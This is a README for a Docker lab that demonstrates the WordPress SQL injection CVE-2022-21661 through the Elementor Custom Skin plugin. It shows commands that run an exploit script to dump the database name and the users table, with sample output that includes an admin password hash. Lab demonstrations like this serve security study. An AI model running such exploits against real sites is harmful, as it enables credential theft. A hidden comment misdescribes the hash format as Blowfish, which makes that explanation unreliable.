# Wordpress 5.8.2 CVE-2022-21661 POC

This enviroment is setup with the Elementor Custom Skin plugin to demonstrate CVE-2022-21661.

## Usage

To start the enviroment:

```shell
sudo ./start.sh
```

To get the admin password get the log from the running container, a new password is generated every time the container is booted. The generated admin password and the instance IP can be viewed by running:

```shell
sudo docker logs test
```

To run the exploit, replace `<payload-id>` with:

1. dump db name
2. dump users table

```shell
python3 sploit.py http://<target-ip>/wp-admin/admin-ajax.php <payload-id>
```

Examples of the returned data (for generated password `rEJhsX8EdkqSXpRxmFPG5w==`):

```shell
$ python3 sploit.py http://172.17.0.2/wp-admin/admin-ajax.php 1
# wordpress

$ python3 sploit.py http://172.17.0.2/wp-admin/admin-ajax.php 2
# 1:admin:$p$bcvl8kyfdva5kbp3s9qhl9fzt0lnxf1
```

<!--As you can see, the format of the returned user data for #2 is `id:username:hash`. The `hash` is in the format `$hash_type$salt$password`, which in this case indicates a Blowfish hash, a random salt of `cvl8kyfd`, and an MD5 password hash of `va5kbp3s9qhl9fzt0lnxf1`.

Resources explaining the above:
- https://www.wpsecurity.press/en/how-secure-is-the-wordpress-passwords-algorithm/
- https://carluc.ci/blog/cracking-wordpress-password-hash/
-->
## Debugging

If you get errors with the startup script, run `sudo service docker restart` and try again.
